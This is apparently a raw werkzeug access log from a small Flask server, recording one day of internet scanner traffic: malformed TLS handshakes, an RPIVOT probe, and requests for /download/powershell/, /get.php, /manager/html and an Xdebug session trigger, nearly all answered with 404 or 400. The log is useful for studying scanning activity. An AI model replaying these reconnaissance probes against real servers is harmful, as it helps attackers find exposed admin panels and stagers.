+ERROR:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:57] code 400, message Bad request syntax ('RPIVOT')
+INFO:werkzeug:80.82.68.18 - - [14/Feb/2025 11:40:57] "[31m[1mRPIVOT[0m" 400 -
+ERROR:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1få.:Ñ\x97ã\x92Xvi"íÕ3)CUÆ \x88Y$0¥\x0e\x00\x04î\x8f-\x18\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+ERROR:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03N´\x0eà\x10·u\x19â½é\x8f\x870åÓ¤\x8a\x81¯\x05\x98\x98F;R\x1aÊ¶`i×\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+INFO:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03N´\x0eà\x10·u\x19â½é\x8f\x870åÓ¤\x8a\x81¯\x05\x98\x98F;R\x1aÊ¶`i×\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] "[33mGET /download/powershell/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.22.131.61 - - [14/Feb/2025 11:51:25] "[33mGET /get.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 11:57:54] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:85.90.246.159 - - [14/Feb/2025 12:13:27] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:85.90.246.159 - - [14/Feb/2025 12:13:27] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03:ß¢\x06pÅhÆ!v@ä\x84ñ\x97¦-öQê\x1c¿\x09|\x8a\x93aøxcÇÖ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 13:30:12] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 14:10:19] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 14:32:24] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:02] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:52] code 400, message Bad request version ('E\\ÈZJ\xad¡½\x87\x9e£O')
+INFO:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:52] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x038Ü!g÷/G¼OE`,t\x13W\x09c\x07\x02QÆ£ø¾ª\x84\x1d°î{Z\x80 N\x91'äw%±¨ÿ\x9fY\x0cE\\ÈZJ­¡½\x87\x9e£O[0m" 400 -
+INFO:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:53] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:53] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x87\x04äHePÝh2ä9ÓÏ\x89JS\x18\x14\x01\x19úÉ/')
+INFO:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:53] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x87\x04äHePÝh2ä9ÓÏ\x89JS\x18\x14\x01\x19úÉ/[0m" 400 -
+INFO:werkzeug:80.82.77.202 - - [14/Feb/2025 14:46:53] "[33mGET /aab9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.113.208.45 - - [14/Feb/2025 15:17:42] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.113.208.45 - - [14/Feb/2025 15:20:05] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.142.54 - - [14/Feb/2025 15:45:42] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:78.108.177.54 - - [14/Feb/2025 15:49:38] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 16:11:44] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 16:20:25] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 17:00:36] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.154.253.6 - - [14/Feb/2025 17:48:33] "[33mGET /login HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 17:58:56] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [14/Feb/2025 18:18:04] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.10 - - [14/Feb/2025 18:23:09] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:167.94.146.57 - - [14/Feb/2025 18:28:30] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:167.94.146.57 - - [14/Feb/2025 18:28:35] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:167.94.146.57 - - [14/Feb/2025 18:28:35] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.146.57 - - [14/Feb/2025 18:28:35] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+INFO:werkzeug:205.210.31.9 - - [14/Feb/2025 19:00:29] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 19:01:23] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:45.56.102.243 - - [14/Feb/2025 19:50:10] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:45.56.102.243 - - [14/Feb/2025 19:50:10] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03°0s¯[\x1a´ Ö*»\x9c\x7f\x96Ú^¡\x9a&PÜäyZ*\x13W\x9d\x1b§\x19Ø Cå<\x96\x9a\x08qú\x1cÉ\x1f!t\x1f\x1f\x97þ\x86×*©\x00ÌA\x08¬¨r&¿l\x18\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:193.68.89.51 - - [14/Feb/2025 19:53:40] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.255.57.58 - - [14/Feb/2025 20:06:37] "[33mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 404 -
